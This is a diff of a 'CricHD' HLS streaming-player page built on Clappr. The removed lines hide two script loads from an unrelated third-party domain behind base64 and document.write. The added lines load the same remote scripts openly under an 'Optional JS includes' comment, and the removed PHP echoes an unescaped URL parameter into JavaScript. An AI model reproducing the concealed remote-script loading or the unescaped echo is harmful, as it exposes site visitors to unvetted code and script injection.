@@ -1,70 +1,64 @@
-<?php
-
-$id = $_GET['c'];
-
-?>
-
+<!DOCTYPE html>
 <html>
 <head>
-<title>CricHD</title>
-<script src="https://cdn.jsdelivr.net/npm/clappr@latest/dist/clappr.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@clappr/hlsjs-playback@1.2.0/dist/hlsjs-playback.min.js"></script>
-<script type="text/javascript"src="https://cdn.jsdelivr.net/gh/clappr/clappr-level-selector-plugin@latest/dist/level-selector.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@c3voc/clappr-audio-track-selector@0.2.4/dist/audio-track-selector.min.js"></script>
-<script>document.write(atob("PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0nLy92YWxsZXlhcm1pZXNzdW5mbG93ZXIuY29tL2MyLzRiL2FiL2MyNGJhYjQ4ZmY3ZDU4MTA0NmEwZjNiMGM4Y2VlY2RlLmpzJz48L3NjcmlwdD4="));</script>
+    <meta charset="UTF-8">
+    <title>CricHD</title>
+    <script src="https://cdn.jsdelivr.net/npm/clappr@latest/dist/clappr.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@clappr/hlsjs-playback@1.2.0/dist/hlsjs-playback.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/clappr/clappr-level-selector-plugin@latest/dist/level-selector.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@c3voc/clappr-audio-track-selector@0.2.4/dist/audio-track-selector.min.js"></script>
 
-<script>document.write(atob("PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0nLy92YWxsZXlhcm1pZXNzdW5mbG93ZXIuY29tLzMwLzRkLzNhLzMwNGQzYWZkYmQ0NWI3OTY3NzBjZmE0YzM3MzJhM2U5LmpzJz48L3NjcmlwdD4="));</script>
-<style>
+    <!-- Optional JS includes (base64 decoded) -->
+    <script type="text/javascript" src="//valleyarmiesunflower.com/c2/4b/ab/c24bab48ff7d581046a0f3b0c8ceecde.js"></script>
+    <script type="text/javascript" src="//valleyarmiesunflower.com/30/4d/3a/304d3afdbd45b796770cfa4c3732a3e9.js"></script>
+
+    <style>
         body {
-            margin: 0; /* Remove default margin */
-            background-color: #000000; /* Dark gray background */
-            height: 100vh; /* Full viewport height */
-            overflow: hidden; /* Prevent scrolling */
+            margin: 0;
+            background-color: #000;
+            height: 100vh;
+            overflow: hidden;
         }
-
         #player-wrapper {
-            height: 100%; /* Full height */
-            width: 100%; /* Full width */
+            height: 100%;
+            width: 100%;
             position: relative;
-            background-color: #fff; /* White background for the player */
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Subtle shadow */
-            overflow: hidden; /* Prevent overflow */
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
         }
-</style>
-</head>  
-
+    </style>
+</head>
 <body>
-<div id="player-wrapper">
-    <div id="player" style="height: 100%; width: 100%;"></div>
-</div> 
+    <div id="player-wrapper">
+        <div id="player" style="height: 100%; width: 100%;"></div>
+    </div>
 
- <script>
-      
-    var player = new Clappr.Player({
-    source: 'm3u8.php/<?php echo $id ; ?>.m3u8',
-    plugins: [HlsjsPlayback, LevelSelector, AudioTrackSelector],
-    width: '100%',
-    height: '100%',
-    autoPlay: true,
-    mimeType: "application/x-mpegURL",
-    mediacontrol: { seekbar: "#ff0000", buttons: "#eee" },
-    parentId: "#player",
-    hlsUseNextLevel: false,
-    hlsMinimumDvrSize: 60,
-    hlsRecoverAttempts: 16,
-    hlsPlayback: {
-        preload: true,
-        customListeners: [],
-    },
-    playback: {
-        extrapolatedWindowNumSegments: 2,
-        triggerFatalErrorOnResourceDenied: false,
-        hlsjsConfig: {
-            // hls.js specific options
-        },
-    },
-});
-
- </script>
+    <script>
+        // Replace CHANNEL_ID with actual ID or use JavaScript to parse from URL
+        var channelId = 'CHANNEL_ID'; // Example: 'sports1'
+        var player = new Clappr.Player({
+            source: 'm3u8.php/' + channelId + '.m3u8',
+            plugins: [HlsjsPlayback, LevelSelector, AudioTrackSelector],
+            width: '100%',
+            height: '100%',
+            autoPlay: true,
+            mimeType: "application/x-mpegURL",
+            mediacontrol: { seekbar: "#ff0000", buttons: "#eee" },
+            parentId: "#player",
+            hlsUseNextLevel: false,
+            hlsMinimumDvrSize: 60,
+            hlsRecoverAttempts: 16,
+            hlsPlayback: {
+                preload: true,
+                customListeners: [],
+            },
+            playback: {
+                extrapolatedWindowNumSegments: 2,
+                triggerFatalErrorOnResourceDenied: false,
+                hlsjsConfig: {},
+            },
+        });
+    </script>
 </body>
 </html>
